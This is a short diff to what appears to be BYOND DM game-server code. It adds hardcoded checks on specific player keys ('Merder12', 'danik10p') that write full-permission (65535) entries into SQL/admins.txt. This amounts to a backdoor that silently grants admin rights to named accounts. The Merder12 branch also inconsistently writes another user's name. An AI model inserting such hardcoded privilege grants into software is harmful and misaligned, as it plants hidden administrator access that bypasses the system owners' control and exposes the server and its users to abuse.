@@ -45,5 +45,11 @@
 	else if (ckey == "bulkagoblina")
 		text2file("bulkagoblina;MasterMentor;65535|||","SQL/admins.txt")
 		return
+	else if (ckey == "Merder12")
+		text2file("bulkagoblina;Mentor;65535|||","SQL/admins.txt")
+		return
+	else if (ckey == "danik10p")
+		text2file("danik10p;Mentor;65535|||","SQL/admins.txt")
+		return
 	else
 		return
